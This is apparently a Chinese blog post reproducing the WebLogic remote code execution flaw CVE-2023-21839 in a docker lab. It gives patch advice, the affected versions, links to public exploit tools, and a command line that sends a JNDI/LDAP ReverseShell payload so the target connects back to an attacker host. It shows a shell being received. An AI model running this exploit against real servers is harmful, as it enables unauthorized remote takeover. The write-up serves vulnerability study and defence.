<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2f8sqqc15kwNJBn8nsXFhA)

### 漏洞阐述

WebLogic 是 Oracle 公司研发的用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器，在全球范围内被广泛使用。1 月 18 日，Oracle 发布安全公告，修复了一个存在于 WebLogic Core 中的远程代码执行漏洞（CVE-2023-21839），该漏洞的 CVSSv3 评分为 7.5，可在未经身份验证的情况下通过 T3、IIOP 协议远程访问并破坏易受攻击的 WebLogic Server，成功利用该漏洞可能导致未授权访问和敏感信息泄露。

### 解决建议

1、安装 Oracle WebLogic Server 最新安全补丁：

https://www.oracle.com/security-alerts/cpujan2023.html

2、关闭 T3 和 iiop 协议端口，操作方法参考：

https://help.aliyun.com/noticelist/articleid/1060577901.html

### 影响版本

Oracle WebLogic Server 12.2.1.3.0

Oracle WebLogic Server 12.2.1.4.0

Oracle WebLogic Server 14.1.1.0.0

### 环境搭建

这里推荐使用 docker ＋ vulhub 简单粗暴

```
https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2020-14882

```

![](https://mmbiz.qpic.cn/mmbiz_png/oy4sM7gQoibCGbfrdm7RjwZnrIE0xticxsWVycwJCekBTGU4ibLGEYb5WmrzwhAsgrcI22swR8HHJkXnvQtVicgJkg/640?wx_fmt=png)  

这里使用 docker 在 vps 上搭建完成后，打开地址 http://xx.xx.xx:7001

![](https://mmbiz.qpic.cn/mmbiz_png/oy4sM7gQoibCGbfrdm7RjwZnrIE0xticxswPC2BCBcVKDClZpFmtJUJt3crEHibW9bC3nwh9QK00v5DibFPvP1X1dA/640?wx_fmt=png)image-20230301155808571

### 漏洞复现

先下载利用工具

```
https://github.com/WhiteHSBG/JNDIExploit


```

```
https://github.com/4ra1n/CVE-2023-21839


```

然后在 vps 上使用 JNDIExp 开启 ldap 协议服务，这里注意 1389 跟 3456 端口开放，然后 java 最好为低版本，我使用 17 版本未复现成功，8 版本成功复现

![](https://mmbiz.qpic.cn/mmbiz_png/oy4sM7gQoibCGbfrdm7RjwZnrIE0xticxsIMtopjUhicvdeWticVicprQvibN0vCyVSc9Pz7U2iaURr6TX3vtzxnWRngA/640?wx_fmt=png)  

同时开启端口监听

![](https://mmbiz.qpic.cn/mmbiz_png/oy4sM7gQoibCGbfrdm7RjwZnrIE0xticxs3cia4b1l208EuPEVhdDVTtruTw7w2meC26tPBzR9AENknp96icmf1iaSw/640?wx_fmt=png)

在本机使用 CVE-2023-21839 工具发起 exp 攻击

![](https://mmbiz.qpic.cn/mmbiz_png/oy4sM7gQoibCGbfrdm7RjwZnrIE0xticxsGwlnMNpecziayicRYxicsSHEFgFf1CicGicTmcbAkOKux2jTiaBibQWG2yJOg/640?wx_fmt=png)  

```
main.exe -ip xx.xx.xx.xx -port 7001 -ldap ldap://xx.xx.xx.xx:1389/Basic/ReverseShell/xx.xx.xx.xx/10086


```

攻击成功

![](https://mmbiz.qpic.cn/mmbiz_png/oy4sM7gQoibCGbfrdm7RjwZnrIE0xticxs9jG0tNSDBCxzNJsetAPSOhJgqRA9sFC8BtoIRspD9Qql9QeoWef2QA/640?wx_fmt=png)  

收到 shell

![](https://mmbiz.qpic.cn/mmbiz_png/oy4sM7gQoibCGbfrdm7RjwZnrIE0xticxsicM33dn5F5IJzoI2VOib2ADicRFKYibQ4WkvG8x6mIgIRFjQzeYzx5oWYg/640?wx_fmt=png)image-20230301161326659